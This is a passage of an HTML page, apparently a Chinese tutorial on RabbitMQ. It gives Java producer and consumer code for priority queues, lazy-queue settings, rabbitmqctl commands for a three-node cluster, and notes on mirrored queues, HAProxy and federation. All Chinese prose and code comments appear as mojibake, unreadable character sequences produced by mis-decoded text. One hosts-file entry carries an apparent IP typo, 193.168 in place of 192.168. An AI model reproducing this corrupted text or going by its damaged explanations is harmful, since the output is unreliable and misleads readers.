class="hljs-number">5</span>).build();<br></code></pre></td></tr></table></figure></li><li><p><strong>æ³¨æ„äº‹é¡¹</strong></p><p>è¦è®©é˜Ÿåˆ—å®ç°ä¼˜å…ˆçº§éœ€è¦åšçš„äº‹æƒ…æœ‰å¦‚ä¸‹äº‹æƒ…:é˜Ÿåˆ—éœ€è¦è®¾ç½®ä¸ºä¼˜å…ˆçº§é˜Ÿåˆ—ï¼Œæ¶ˆæ¯éœ€è¦è®¾ç½®æ¶ˆæ¯çš„ä¼˜å…ˆçº§ï¼Œæ¶ˆè´¹è€…éœ€è¦ç­‰å¾…æ¶ˆæ¯å·²ç»å‘é€åˆ°é˜Ÿåˆ—ä¸­æ‰å»æ¶ˆè´¹å› ä¸ºï¼Œè¿™æ ·æ‰æœ‰æœºä¼šå¯¹æ¶ˆæ¯è¿›è¡Œæ’åº</p></li></ol><blockquote><p>ä»£ç å®ç°</p></blockquote><ol><li><p>ç”Ÿäº§è€…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Producer</span> &#123;<br>    <span class="hljs-comment">// é˜Ÿåˆ—åç§°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span>  <span class="hljs-keyword">final</span> String QUEUE_NAME=<span class="hljs-string">&quot;hello&quot;</span>;<br><br>    <span class="hljs-comment">// å‘æ¶ˆæ¯</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, TimeoutException &#123;<br>        <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªè¿æ¥å·¥å‚</span><br>        <span class="hljs-type">ConnectionFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConnectionFactory</span>();<br><br>        <span class="hljs-comment">// å·¥å‚IPè¿æ¥RabbitMQçš„é˜Ÿåˆ—</span><br>        factory.setHost(<span class="hljs-string">&quot;192.168.163.128&quot;</span>);<br>        <span class="hljs-comment">// ç”¨æˆ·å</span><br>        factory.setUsername(<span class="hljs-string">&quot;admin&quot;</span>);<br>        <span class="hljs-comment">// å¯†ç </span><br>        factory.setPassword(<span class="hljs-string">&quot;123&quot;</span>);<br><br>        <span class="hljs-comment">// åˆ›å»ºè¿æ¥</span><br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> factory.newConnection();<br>        <span class="hljs-comment">// è·å–ä¿¡é“</span><br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> connection.createChannel();<br>        <br>        Map&lt;String, Object&gt; arguments = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-comment">//å®˜æ–¹å…è®¸æ˜¯0-255ä¹‹é—´ï¼Œæ­¤å¤„è®¾ç½®10ï¼Œå…è®¸ä¼˜åŒ–çº§èŒƒå›´ä¸º0-10ï¼Œä¸è¦è®¾ç½®è¿‡å¤§ï¼Œæµªè´¹CPUä¸å†…å­˜</span><br>        arguments.put(<span class="hljs-string">&quot;x-max-priority&quot;</span>,<span class="hljs-number">10</span>);<br>        channel.queueDeclare(QUEUE_NAME,<span class="hljs-literal">true</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,arguments);<br>        <span class="hljs-comment">// å‘æ¶ˆæ¯</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;info&quot;</span> + i;<br>            <span class="hljs-keyword">if</span>(i == <span class="hljs-number">5</span>)&#123;<br>                AMQP.<span class="hljs-type">BasicProperties</span> <span class="hljs-variable">properties</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AMQP</span>.BasicProperties().builder().priority(<span class="hljs-number">5</span>).build();<br>                channel.basicPublish(<span class="hljs-string">&quot;&quot;</span>,QUEUE_NAME,properties,message.getBytes(StandardCharsets.UTF_8));<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                channel.basicPublish(<span class="hljs-string">&quot;&quot;</span>,QUEUE_NAME,<span class="hljs-literal">null</span>,message.getBytes(StandardCharsets.UTF_8));<br><br>            &#125;<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;æ¶ˆæ¯å‘é€å®Œæ¯•ï¼&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>æ¶ˆè´¹è€…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Consumer</span> &#123;<br>    <span class="hljs-comment">// é˜Ÿåˆ—åç§°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">QUEUE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hello&quot;</span>;<br><br>    <span class="hljs-comment">// æ¥å—æ¶ˆæ¯</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, TimeoutException &#123;<br>        <span class="hljs-comment">// åˆ›å»ºè¿æ¥å·¥å‚</span><br>        <span class="hljs-type">ConnectionFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConnectionFactory</span>();<br><br>        factory.setHost(<span class="hljs-string">&quot;192.168.163.128&quot;</span>);<br>        factory.setUsername(<span class="hljs-string">&quot;admin&quot;</span>);<br>        factory.setPassword(<span class="hljs-string">&quot;123&quot;</span>);<br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> factory.newConnection();<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> connection.createChannel();<br>        <span class="hljs-comment">// å£°æ˜ æ¥å—æ¶ˆæ¯</span><br>        <span class="hljs-type">DeliverCallback</span> <span class="hljs-variable">deliverCallback</span> <span class="hljs-operator">=</span> (consumerTag,message) -&gt; &#123;<br>            System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody()));<br>        &#125;;<br>        <span class="hljs-comment">// å£°æ˜ å–æ¶ˆæ¶ˆæ¯</span><br>        <span class="hljs-type">CancelCallback</span> <span class="hljs-variable">cancelCallback</span> <span class="hljs-operator">=</span> consumer -&gt; &#123;<br>            System.out.println(<span class="hljs-string">&quot;æ¶ˆæ¯æ¶ˆè´¹è¢«ä¸­æ–­&quot;</span>);<br>        &#125;;<br>        System.out.println(<span class="hljs-string">&quot;C2ç­‰å¾…æ¥å—æ¶ˆæ¯.......&quot;</span>);<br>        channel.basicConsume(QUEUE_NAME,<span class="hljs-literal">true</span>,deliverCallback,cancelCallback);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>æ•ˆæœ</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113161112295.png" alt="image-20230113161112295" /></p></li></ol><h2 id="103-æƒ°æ€§é˜Ÿåˆ—"><a class="markdownIt-Anchor" href="#103-æƒ°æ€§é˜Ÿåˆ—"></a> 10.3 æƒ°æ€§é˜Ÿåˆ—</h2><blockquote><p>ä½¿ç”¨åœºæ™¯</p></blockquote><p>RabbitMQä» 3.6.0ç‰ˆæœ¬å¼€å§‹å¼•å…¥äº†æƒ°æ€§é˜Ÿåˆ—çš„æ¦‚å¿µã€‚æƒ°æ€§é˜Ÿåˆ—ä¼šå°½å¯èƒ½çš„å°†æ¶ˆæ¯å­˜å…¥ç£ç›˜ä¸­ï¼Œè€Œåœ¨æ¶ˆè´¹è€…æ¶ˆè´¹åˆ°ç›¸åº”çš„æ¶ˆæ¯æ—¶æ‰ä¼šè¢«åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œå®ƒçš„ä¸€ä¸ªé‡è¦çš„è®¾è®¡ç›®æ ‡æ˜¯èƒ½å¤Ÿæ”¯æŒæ›´é•¿çš„é˜Ÿåˆ—ï¼Œå³æ”¯æŒæ›´å¤šçš„æ¶ˆæ¯å­˜å‚¨ã€‚å½“æ¶ˆè´¹è€…ç”±äºå„ç§å„æ ·çš„åŸå› (æ¯”å¦‚æ¶ˆè´¹è€…ä¸‹çº¿ã€å®•æœºäº¦æˆ–è€…æ˜¯ç”±äºç»´æŠ¤è€Œå…³é—­ç­‰)è€Œè‡´ä½¿é•¿æ—¶é—´å†…ä¸èƒ½æ¶ˆè´¹æ¶ˆæ¯é€ æˆå †ç§¯æ—¶ï¼Œæƒ°æ€§é˜Ÿåˆ—å°±å¾ˆæœ‰å¿…è¦äº†ã€‚</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œå½“ç”Ÿäº§è€…å°†æ¶ˆæ¯å‘é€åˆ°RabbitMQçš„æ—¶å€™ï¼Œé˜Ÿåˆ—ä¸­çš„æ¶ˆæ¯ä¼šå°½å¯èƒ½çš„å­˜å‚¨åœ¨å†…å­˜ä¹‹ä¸­ï¼Œè¿™æ ·å¯ä»¥æ›´åŠ å¿«é€Ÿçš„å°†æ¶ˆæ¯å‘é€ç»™æ¶ˆè´¹è€…ã€‚å³ä½¿æ˜¯æŒä¹…åŒ–çš„æ¶ˆæ¯ï¼Œåœ¨è¢«å†™å…¥ç£ç›˜çš„åŒæ—¶ä¹Ÿä¼šåœ¨å†…å­˜ä¸­é©»ç•™ä¸€ä»½å¤‡ä»½ã€‚å½“RabbitMQéœ€è¦é‡Šæ”¾å†…å­˜çš„æ—¶å€™ï¼Œä¼šå°†å†…å­˜ä¸­çš„æ¶ˆæ¯æ¢é¡µè‡³ç£ç›˜ä¸­ï¼Œè¿™ä¸ªæ“ä½œä¼šè€—è´¹è¾ƒé•¿çš„æ—¶é—´ï¼Œä¹Ÿä¼šé˜»å¡é˜Ÿåˆ—çš„æ“ä½œï¼Œè¿›è€Œæ— æ³•æ¥æ”¶æ–°çš„æ¶ˆæ¯ã€‚è™½ç„¶ RabbitMQçš„å¼€å‘è€…ä»¬ä¸€ç›´åœ¨å‡çº§ç›¸å…³çš„ç®—æ³•ï¼Œä½†æ˜¯æ•ˆæœå§‹ç»ˆä¸å¤ªç†æƒ³ï¼Œå°¤å…¶æ˜¯åœ¨æ¶ˆæ¯é‡ç‰¹åˆ«å¤§çš„æ—¶å€™ã€‚</p><blockquote><p>ä¸¤ç§æ¨¡å¼</p></blockquote><p>é˜Ÿåˆ—å…·å¤‡ä¸¤ç§æ¨¡å¼: defaultå’Œlazy.é»˜è®¤çš„ä¸ºdefaultæ¨¡å¼ï¼Œåœ¨3.6.0ä¹‹å‰çš„ç‰ˆæœ¬æ— éœ€åšä»»ä½•å˜æ›´ã€‚lazy_æ¨¡å¼å³ä¸ºæƒ°æ€§é˜Ÿåˆ—çš„æ¨¡å¼ï¼Œå¯ä»¥é€šè¿‡è°ƒç”¨channel.queueDecareæ–¹æ³•çš„æ—¶å€™åœ¨å‚æ•°ä¸­è®¾ç½®ï¼Œä¹Ÿå¯ä»¥é€šè¿‡<br />Policyçš„æ–¹å¼è®¾ç½®ï¼Œå¦‚æœä¸€ä¸ªé˜Ÿåˆ—åŒæ—¶ä½¿ç”¨è¿™ä¸¤ç§æ–¹å¼è®¾ç½®çš„è¯ï¼Œé‚£ä¹ˆPolicyçš„æ–¹å¼å…·å¤‡æ›´é«˜çš„ä¼˜å…ˆçº§ã€‚å¦‚æœè¦é€šè¿‡å£°æ˜çš„æ–¹å¼æ”¹å˜å·²æœ‰é˜Ÿåˆ—çš„æ¨¡å¼çš„è¯ï¼Œé‚£ä¹ˆåªèƒ½å…ˆåˆ é™¤é˜Ÿåˆ—ï¼Œç„¶åå†é‡æ–°å£°æ˜ä¸€ä¸ªæ–°çš„ã€‚<br />åœ¨é˜Ÿåˆ—å£°æ˜çš„æ—¶å€™å¯ä»¥é€šè¿‡&quot;x-queue-mode&quot;å‚æ•°æ¥è®¾ç½®é˜Ÿåˆ—çš„æ¨¡å¼ï¼Œå–å€¼ä¸º&quot;default&quot;å’Œ&quot;lazyâ€&quot;ã€‚ä¸‹é¢ç¤ºä¾‹ä¸­æ¼”ç¤ºäº†ä¸€ä¸ªæƒ°æ€§é˜Ÿåˆ—çš„å£°æ˜ç»†èŠ‚:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Map&lt;String, Object&gt; args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();<br>args.put(<span class="hljs-string">&quot;x-queue-mode&quot;</span>,<span class="hljs-string">&quot;lazy&quot;</span>);<br>channel.queueDeclare( <span class="hljs-string">&quot;myqueue&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>,args);<br></code></pre></td></tr></table></figure><blockquote><p>å†…å­˜å¯¹æ¯”</p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113161421416.png" alt="image-20230113161421416" /></p><p>åœ¨å‘é€1ç™¾ä¸‡æ¡æ¶ˆæ¯ï¼Œæ¯æ¡æ¶ˆæ¯å¤§æ¦‚å 1KBçš„æƒ…å†µä¸‹ï¼Œæ™®é€šé˜Ÿåˆ—å ç”¨å†…å­˜æ˜¯1.2GB,è€Œæƒ°æ€§é˜Ÿåˆ—ä»…ä»…å ç”¨1.5MB</p><h1 id="11-rabbitmqé›†ç¾¤"><a class="markdownIt-Anchor" href="#11-rabbitmqé›†ç¾¤"></a> 11. RabbitMQé›†ç¾¤</h1><h2 id="111-æ­å»ºé›†ç¾¤"><a class="markdownIt-Anchor" href="#111-æ­å»ºé›†ç¾¤"></a> 11.1 æ­å»ºé›†ç¾¤</h2><blockquote><p>æ­¥éª¤</p></blockquote><ol><li><p>å…‹éš†ä¸‰å°è™šæ‹Ÿæœº ï¼Œä¿®æ”¹ä¸‰å°æœºå™¨çš„åç§°ä¸ºnode1ã€node2ã€node3</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim /etc/hosts<br>node1<br>node2<br>node3<br></code></pre></td></tr></table></figure></li><li><p>ä¿®æ”¹ä¸‰å°æœºå™¨çš„hostsæ–‡ä»¶ä¸­çš„åç§°ï¼Œè®©å„ä¸ªèŠ‚ç‚¹éƒ½èƒ½äº’ç›¸è¯†åˆ«å¯¹è±¡</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim /etc/hosts<br>192.168.163.128 node1<br>192.168.163.132 node2<br>193.168.163.131 node3<br></code></pre></td></tr></table></figure></li><li><p>ä»¥ç¡®ä¿å„ä¸ªèŠ‚ç‚¹çš„cookieæ–‡ä»¶ä½¿ç”¨çš„æ˜¯åŒä¸€ä¸ªå€¼ï¼šåœ¨node1ä¸Šæ‰§è¡Œè¿œç¨‹æ“ä½œå‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">scp /var/lib/rabbitmq/.erlang.cookie root@node2:/var/lib/rabbitmq/.erlang.cookie<br>scp /var/lib/rabbitmq/.erlang.cookie root@node3:/var/lib/rabbitmq/.erlang.cookie<br></code></pre></td></tr></table></figure></li><li><p>å¯åŠ¨RabbitMQæœåŠ¡ï¼Œé¡ºå¸¦å¯åŠ¨Erlangè™šæ‹Ÿæœºå’ŒRabbitMQåº”ç”¨æœåŠ¡ï¼Œä¸‰å°èŠ‚ç‚¹ä¸‹æ‰§è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">rabbitmq-server -detached<br></code></pre></td></tr></table></figure></li><li><p>åœ¨èŠ‚ç‚¹2æ‰§è¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">rabbitmqctl stopä¼šå°†Erlangè™šæ‹Ÿæœºå…³é—­  rabbitmqctl stop_app åªå…³é—­rabbitmqæœåŠ¡</span><br>rabbitmqctl stop_app<br>rabbitmqctl reset<br>rabbitmqctl join_cluster rabbit@node1<br><span class="hljs-meta prompt_"># </span><span class="language-bash">åªå¯åŠ¨rabbitmqæœåŠ¡</span><br>rabbitmqctl start_app<br></code></pre></td></tr></table></figure></li><li><p>åœ¨èŠ‚ç‚¹3æ‰§è¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">rabbitmqctl stop_app<br>rabbitmqctl reset<br>rabbitmqctl join_cluster rabbit@node2<br>rabbitmqctl start_app<br></code></pre></td></tr></table></figure></li><li><p>æŸ¥çœ‹é›†ç¾¤çŠ¶æ€</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">rabbitmqctl cluster_status<br></code></pre></td></tr></table></figure></li><li><p>éœ€è¦é‡æ–°è®¾ç½®ç”¨æˆ·</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">åˆ›å»ºè´¦å·</span><br>rabbitmqctl add_user admin 123<br><span class="hljs-meta prompt_"># </span><span class="language-bash">è®¾ç½®ç”¨æˆ·è§’è‰²</span><br>rabbitmqctl set_user_tags admin administrator<br><span class="hljs-meta prompt_"># </span><span class="language-bash">è®¾ç½®ç”¨æˆ·æƒé™</span><br>rabbitmqctl set_permissions -p &quot;/&quot; admin &quot;.*&quot; &quot;.*&quot; &quot;.*&quot; <br></code></pre></td></tr></table></figure><p>ä¹‹ååœ¨ä¸‰ä¸ªé›†ç¾¤èŠ‚ç‚¹çš„ä»»æ„ä¸€ä¸ªå¯è§†åŒ–ç•Œé¢ç™»å½•å‡å¯</p></li><li><p>æ¥è§¦é›†ç¾¤èŠ‚ç‚¹ï¼Œnode2å’Œnode3åˆ†åˆ«æ‰§è¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">rabbitmqctl stop_app<br>rabbitmqctl reset<br>rabbitmqctl start_app<br>rabbitmqctl cluster_status<br><span class="hljs-meta prompt_"># </span><span class="language-bash">æ­¤é¡¹å‘½ä»¤å‡åœ¨node1ä¸Šæ‰§è¡Œ</span><br>rabbitmqctl forget_cluster_node rabbit@node2<br></code></pre></td></tr></table></figure></li></ol><h2 id="112-é•œåƒé˜Ÿåˆ—"><a class="markdownIt-Anchor" href="#112-é•œåƒé˜Ÿåˆ—"></a> 11.2 é•œåƒé˜Ÿåˆ—</h2><blockquote><p>ä½¿ç”¨é•œåƒçš„åŸå› </p></blockquote><p>å¦‚æœRabbitMQé›†ç¾¤ä¸­åªæœ‰ä¸€ä¸ªBrokerèŠ‚ç‚¹ï¼Œé‚£ä¹ˆè¯¥èŠ‚ç‚¹çš„å¤±æ•ˆå°†å¯¼è‡´æ•´ä½“æœåŠ¡çš„ä¸´æ—¶æ€§ä¸å¯ç”¨ï¼Œå¹¶ä¸”ä¹Ÿå¯èƒ½ä¼šå¯¼è‡´æ¶ˆæ¯çš„ä¸¢å¤±ã€‚å¯ä»¥å°†æ‰€æœ‰æ¶ˆæ¯éƒ½è®¾ç½®ä¸ºæŒä¹…åŒ–,å¹¶ä¸”å¯¹åº”é˜Ÿåˆ—çš„durableå±æ€§ä¹Ÿè®¾ç½®ä¸ºtrue,ä½†æ˜¯è¿™æ ·ä»ç„¶æ— æ³•é¿å…ç”±äºç¼“å­˜å¯¼è‡´çš„é—®é¢˜:å› ä¸ºæ¶ˆæ¯åœ¨å‘é€ä¹‹åå’Œè¢«å†™å…¥ç£ç›˜äº•æ‰§è¡Œåˆ·ç›˜åŠ¨ä½œä¹‹é—´å­˜åœ¨ä¸€ä¸ªçŸ­æš‚å´ä¼šäº§ç”Ÿé—®é¢˜çš„æ—¶é—´çª—ã€‚é€šè¿‡publisherconfirmæœºåˆ¶èƒ½å¤Ÿç¡®ä¿å®¢æˆ·ç«¯çŸ¥é“å“ªäº›æ¶ˆæ¯å·±ç»å­˜å…¥ç£ç›˜ï¼Œå°½ç®¡å¦‚æ­¤ï¼Œä¸€èˆ¬ä¸å¸Œæœ›é‡åˆ°å› å•ç‚¹æ•…éšœå¯¼è‡´çš„æœåŠ¡ä¸å¯ç”¨ã€‚<br />å¼•å…¥é•œåƒé˜Ÿåˆ—ï¼ˆMirror Queueï¼‰çš„æœºåˆ¶ï¼Œå¯ä»¥å°†é˜Ÿåˆ—é•œåƒåˆ°é›†ç¾¤ä¸­çš„å…¶ä»–BrokerèŠ‚ç‚¹ä¹‹ä¸Šï¼Œå¦‚æœé›†ç¾¤ä¸­çš„ä¸€ä¸ªèŠ‚ç‚¹å¤±æ•ˆäº†ï¼Œé˜Ÿåˆ—èƒ½è‡ªåŠ¨åœ°åˆ‡æ¢åˆ°é•œåƒä¸­çš„å¦ä¸€ä¸ªèŠ‚ç‚¹ä¸Šä»¥ä¿è¯æœåŠ¡çš„å¯ç”¨æ€§ã€‚</p><blockquote><p>æ­å»ºæ­¥éª¤</p></blockquote><ol><li><p>å¯åŠ¨ä¸‰å°é›†ç¾¤èŠ‚ç‚¹</p></li><li><p>éšä¾¿æ‰¾ä¸€ä¸ªèŠ‚ç‚¹æ·»åŠ policy</p></li><li><p>åœ¨node1åˆ›å»ºä¸€ä¸ªé˜Ÿåˆ—å‘å™¢æ˜¯é‚£ä¸ªä¸€æ¡ä¿¡æ¯ï¼Œé˜Ÿåˆ—å­˜åœ¨é•œåƒé˜Ÿåˆ—</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113161708382.png" alt="image-20230113161708382" /></p></li><li><p>åœ¨node1ä¸Šåˆ›å»ºä¸€ä¸ªé˜Ÿåˆ—å‘é€ä¸€æ¡æ¶ˆæ¯ï¼Œé˜Ÿåˆ—å­˜åœ¨é•œåƒé˜Ÿåˆ—</p></li></ol><h2 id="113-å®ç°é«˜å¯ç”¨è´Ÿè½½å‡è¡¡"><a class="markdownIt-Anchor" href="#113-å®ç°é«˜å¯ç”¨è´Ÿè½½å‡è¡¡"></a> 11.3 å®ç°é«˜å¯ç”¨è´Ÿè½½å‡è¡¡</h2><p>HAProxy.æä¾›é«˜å¯ç”¨æ€§ã€è´Ÿè½½å‡è¡¡åŠåŸºäºTCPHTTPåº”ç”¨çš„ä»£ç†ï¼Œæ”¯æŒè™šæ‹Ÿä¸»æœºï¼Œå®ƒæ˜¯å…è´¹ã€å¿«é€Ÿå¹¶ä¸”å¯é çš„ä¸€ç§è§£å†³æ–¹æ¡ˆï¼ŒåŒ…æ‹¬Twitter,Reddit,StackOverflow,GitHub.åœ¨å†…çš„å¤šå®¶çŸ¥åäº’è”ç½‘å…¬å¸åœ¨ä½¿ç”¨ã€‚HAProxyå®ç°äº†ä¸€ç§äº‹ä»¶é©±åŠ¨ã€å•ä¸€è¿›ç¨‹æ¨¡å‹ï¼Œæ­¤æ¨¡å‹æ”¯æŒéå¸¸å¤§çš„äº•å‘è¿æ¥æ•°ã€‚<br />æ‰©å±•nginx,lvs,haproxx.pé—´çš„åŒºåˆ«: <a href="http://www.ha97.com/5646.html">http://www.ha97.com/5646.html</a></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113161725946.png" alt="image-20230113161725946" /></p><h2 id="114-federation-exchange"><a class="markdownIt-Anchor" href="#114-federation-exchange"></a> 11.4 Federation Exchange</h2><blockquote><p>ä½¿ç”¨åŸå› </p></blockquote><p>(brokeråŒ—äº¬)ï¼Œ(brokeræ·±åœ³)å½¼æ­¤ä¹‹é—´ç›¸è·ç”šè¿œï¼Œç½‘ç»œå»¶è¿Ÿæ˜¯ä¸€ä¸ªä¸å¾—ä¸é¢å¯¹çš„é—®é¢˜ã€‚æœ‰ä¸€ä¸ªåœ¨åŒ—äº¬çš„ä¸šåŠ¡(ClientåŒ—äº¬)éœ€è¦è¿æ¥(brokeråŒ—äº¬),å‘å…¶ä¸­çš„äº¤æ¢å™¨exchangeA.å‘é€æ¶ˆæ¯ï¼Œæ­¤æ—¶çš„ç½‘ç»œå»¶è¿Ÿå¾ˆå°,(ClientåŒ—äº¬)å¯ä»¥è¿…é€Ÿå°†æ¶ˆæ¯å‘é€è‡³exchangeA.ä¸­ï¼Œå°±ç®—åœ¨å¼€å¯äº†publisherconfirm.æœºåˆ¶æˆ–è€…äº‹åŠ¡æœºåˆ¶çš„æƒ…å†µä¸‹ï¼Œä¹Ÿå¯ä»¥è¿…é€Ÿæ”¶åˆ°ç¡®è®¤ä¿¡æ¯ã€‚æ­¤æ—¶åˆæœ‰ä¸ªåœ¨æ·±åœ³çš„ä¸šåŠ¡(Clientæ·±åœ³)éœ€è¦å‘exchangeAå‘é€æ¶ˆæ¯ï¼Œé‚£ä¹ˆ(Clientæ·±åœ³)(brokeråŒ—äº¬)ä¹‹é—´æœ‰å¾ˆå¤§çš„ç½‘ç»œå»¶è¿Ÿï¼Œ(Clientæ·±åœ³)å°†å‘é€æ¶ˆæ¯è‡³exchangeAä¼šç»å†ä¸€å®šçš„å»¶è¿Ÿï¼Œå°¤å…¶æ˜¯åœ¨å¼€å¯äº†publisherconfirm.æœºåˆ¶æˆ–è€…äº‹åŠ¡æœºåˆ¶çš„æƒ…å†µä¸‹ï¼Œ(Clientæ·±åœ³)ä¼šç­‰å¾…å¾ˆé•¿çš„å»¶è¿Ÿæ—¶é—´æ¥æ¥æ”¶(brokeråŒ—äº¬)çš„ç¡®è®¤ä¿¡æ¯ï¼Œè¿›è€Œå¿…ç„¶é€ æˆè¿™æ¡å‘é€çº¿ç¨‹çš„æ€§èƒ½é™ä½ï¼Œç”šè‡³é€ æˆä¸€å®šç¨‹åº¦ä¸Šçš„é˜»å¡ã€‚<br />å°†ä¸šåŠ¡(Clientæ·±åœ³)éƒ¨ç½²åˆ°åŒ—äº¬çš„æœºæˆ¿å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä½†æ˜¯å¦‚æœ(Clientæ·±åœ³)è°ƒç”¨çš„å¦äº›æœåŠ¡éƒ½éƒ¨ç½²åœ¨æ·±åœ³ï¼Œé‚£ä¹ˆåˆä¼šå¼•å‘æ–°çš„æ—¶å»¶é—®é¢˜ï¼Œæ€»ä¸è§å¾—å°†æ‰€æœ‰ä¸šåŠ¡å…¨éƒ¨éƒ¨ç½²åœ¨ä¸€ä¸ªæœºæˆ¿ï¼Œé‚£ä¹ˆå®¹ç¾åˆä½•ä»¥å®ç°?è¿™é‡Œä½¿ç”¨Federationæ’ä»¶å°±å¯ä»¥å¾ˆå¥½åœ°è§£å†³è¿™ä¸ªé—®é¢˜.</p><p><img 